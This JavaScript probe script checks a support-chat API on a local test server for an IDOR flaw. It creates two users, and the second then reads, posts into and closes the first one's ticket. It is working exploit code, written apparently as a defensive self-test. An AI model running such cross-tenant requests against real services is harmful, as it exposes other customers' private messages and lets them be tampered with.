/** Probe F1: cross-tenant access to another customer's support ticket (IDOR). */
const API = process.env.API ?? "http://127.0.0.1:4100/api";
const DEMO_OTP = "123456";

async function call(path, { method = "GET", token, body } = {}) {
  const res = await fetch(`${API}${path}`, {
    method,
    headers: { "content-type": "application/json", ...(token ? { authorization: `Bearer ${token}` } : {}) },
    ...(body ? { body: JSON.stringify(body) } : {}),
  });
  let json = null; try { json = await res.json(); } catch {}
  return { status: res.status, body: json };
}
const freshPhone = () => "9" + Math.floor(100000000 + Math.random() * 899999999);
async function login(phone) {
  await call("/auth/send-otp", { method: "POST", body: { phone } });
  const r = await call("/auth/verify-otp", { method: "POST", body: { phone, code: DEMO_OTP } });
  return { token: r.body?.data?.token, userId: r.body?.data?.user?.id };
}

const main = async () => {
  const victim = await login(freshPhone());
  const attacker = await login(freshPhone());

  const ticket = await call("/chat/tickets", { method: "POST", token: victim.token, body: { subject: "My private billing issue" } });
  const ticketId = ticket.body?.data?._id ?? ticket.body?.data?.id;
  await call(`/chat/tickets/${ticketId}/messages`, { method: "POST", token: victim.token, body: { text: "My card ending 4242 was double charged, ref #99812" } });

  console.log(`\n[F1] Support-ticket IDOR  (victim ticket ${ticketId})`);

  const read = await call(`/chat/tickets/${ticketId}/messages`, { token: attacker.token });
  const leaked = read.status === 200 && Array.isArray(read.body?.data) && read.body.data.length > 0;
  console.log(`   attacker READ  victim's messages -> HTTP ${read.status}` +
    (leaked ? `  LEAKED: ${JSON.stringify(read.body.data.map((m) => m.text))}` : ""));

  const write = await call(`/chat/tickets/${ticketId}/messages`, { method: "POST", token: attacker.token, body: { text: "Attacker injected this into your ticket" } });
  console.log(`   attacker WRITE into victim's ticket -> HTTP ${write.status}`);

  const close = await call(`/chat/tickets/${ticketId}/close`, { method: "PATCH", token: attacker.token });
  console.log(`   attacker CLOSE victim's ticket -> HTTP ${close.status}`);

  const bad = leaked || write.status === 200 || close.status === 200;
  console.log(`   => ${bad
    ? "🔴 VULNERABLE: any authenticated user can read, post into, and close ANY ticket by id. listMessages()/saveMessage()/closeTicket() take a bare ticketId with no owner check."
    : "🟢 OK"}`);
};
main().catch((e) => { console.error(e); process.exit(1); });
